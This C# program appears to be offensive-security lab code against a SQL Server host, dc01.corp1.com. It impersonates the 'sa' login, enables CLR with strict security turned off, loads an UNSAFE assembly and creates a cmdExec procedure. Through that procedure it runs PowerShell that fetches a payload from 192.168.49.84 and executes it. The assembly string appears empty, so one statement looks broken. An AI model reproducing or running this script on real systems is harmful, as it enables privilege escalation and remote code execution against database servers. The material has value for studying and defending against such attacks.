using System;
using System.Data.SqlClient;

namespace SqlDLLImport
{
    class Program
    {
        static void Main(string[] args)
        {
            //HARDCODED SERVER FQDN HERE
            String sqlServer = "dc01.corp1.com";
            //Default DB name on MS SQL
            String database = "master";

            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);

            String impersonateUser = "EXECUTE AS LOGIN = 'sa';";
            String enableOptions = "use msdb; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'clr enabled',1; RECONFIGURE; EXEC sp_configure 'clr strict security', 0; RECONFIGURE;";
            // On Disk assembly
            //String createAsm = "CREATE ASSEMBLY myAssembly FROM 'c:\\tools\\SqlDLLCmdExec.dll' WITH PERMISSION_SET = UNSAFE;";
            //Hex Assembly
            //String createAsm = "CREATE ASSEMBLY myAssembly FROM  WITH PERMISSION_SET = UNSAFE;";
            String createAsm = "CREATE ASSEMBLY myAssembly FROM  WITH PERMISSION_SET = UNSAFE;";

            String createPro = "CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec];";
            String execCmd = "EXEC cmdExec 'cmd /c powershell.exe -ep bypass iex (iwr http://192.168.49.84/run64.txt -UseBasicParsing)';";
            try
            {
                con.Open();
                Console.WriteLine("Auth success!");
            }
            catch
            {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }

            SqlCommand command = new SqlCommand(impersonateUser, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand(enableOptions, con);
            reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand(createAsm, con);
            reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand(createPro, con);
            reader = command.ExecuteReader();
            reader.Close();
            
            command = new SqlCommand(execCmd, con);
            reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("Result of the command is: " + reader[0]);
            reader.Close();
            
            con.Close();
        }
    }
}